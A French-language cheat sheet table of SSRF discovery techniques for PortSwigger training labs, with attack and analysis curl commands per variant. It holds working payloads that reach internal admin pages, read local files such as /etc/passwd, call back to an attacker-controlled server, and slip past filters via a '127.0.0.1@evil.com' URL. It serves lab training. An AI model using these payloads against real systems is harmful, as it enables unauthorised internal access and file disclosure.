# SSRF

Voici un tableau synthétique pour l’analyse et la découverte des failles SSRF sur les labs PortSwigger, **avec des commandes curl différenciées pour l’attaque et l’analyse** selon chaque cas, des charges utiles neutres, et des explications claires en français :

| Type / Lab                                   | Payload d’attaque neutre (exemple)         | Commande d’attaque (curl)                                                                                         | Commande(s) d’analyse curl                                                                                       | Élément d’analyse (raison préalable)                        | Méthodologie détaillée de découverte                                                                                   | URL PortSwigger ou source utile                                      |
|-----------------------------------------------|--------------------------------------------|-------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------|-------------------------------------------------------------|-----------------------------------------------------------------------------------------------------------------------|---------------------------------------------------------------------|
| SSRF basique (réponse visible)                | URL locale (http://127.0.0.1/admin)        | curl -X POST -d "stockApi=http://127.0.0.1/admin" https://LAB/product/stock                                      | curl -X POST -d "stockApi=https://www.example.com/" https://LAB/product/stock                                    | Différence de contenu dans la réponse                        | Injectez une URL interne dans le paramètre vulnérable. Comparez la réponse avec celle obtenue pour une URL externe. Si le contenu diffère ou révèle des infos internes, la faille est présente. | https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost |
| SSRF semi-aveugle (réponse partielle)         | URL interne affichant statut ou erreur      | curl -X POST -d "stockApi=http://192.168.0.1:8080/test" https://LAB/product/stock                                | curl -X POST -d "stockApi=https://www.example.com/" https://LAB/product/stock                                    | Codes d’erreur ou messages différents dans la réponse        | Injectez une URL interne ou non routable. Observez la différence de codes d’état HTTP ou de messages d’erreur dans la réponse par rapport à une URL externe. | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md |
| SSRF aveugle (blind, interaction externe)     | URL vers serveur contrôlé                   | curl -X POST -d "stockApi=http://votre-serveur.com/ssrf" https://LAB/product/stock                               | Surveillez les logs ou requêtes sur votre serveur externe (tcpdump, Burp Collaborator, logs web)                | Détection d’une requête sur votre serveur externe            | Injectez une URL pointant vers un serveur que vous contrôlez. Surveillez ce serveur pour détecter une connexion sortante du serveur vulnérable (preuve de l’exploitation SSRF). | https://portswigger.net/web-security/ssrf/blind |
| SSRF basée sur le temps (time-based)          | URL interne lente ou endpoint delay         | curl -X POST -d "stockApi=http://127.0.0.1:8080/delai" https://LAB/product/stock                                 | Mesurez le temps de réponse avec time ou curl -w "@curl-format.txt"                                              | Temps de réponse anormalement long                            | Injectez une URL interne ou contrôlée qui provoque un délai de réponse (ex : endpoint /delay). Mesurez le temps de réponse. Un délai anormal indique une SSRF basée sur le temps. | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md |
| SSRF avancée (file://, gopher://, etc.)       | file:///etc/passwd ou gopher://payload      | curl -X POST -d "stockApi=file:///etc/hostname" https://LAB/product/stock                                        | curl -X POST -d "stockApi=https://www.example.com/" https://LAB/product/stock                                    | Réponse contenant un contenu inattendu ou erreur spécifique   | Testez des schémas alternatifs (file, gopher, dict, ftp). Comparez la réponse à une requête classique. Un contenu inattendu ou une erreur spécifique révèle la faille. | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md |
| SSRF avec contournement de filtrage           | URL obfusquée ou encodée                    | curl -X POST -d "stockApi=http://127.0.0.1@evil.com/admin" https://LAB/product/stock                             | curl -X POST -d "stockApi=http://127.0.0.1/admin" https://LAB/product/stock                                     | Accès à une ressource interne malgré un filtrage              | Utilisez des variantes d’URL (obfuscation, encodage, double URL, etc.) pour contourner les filtres. Comparez la réponse avec celle d’une URL classique. | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md |

---

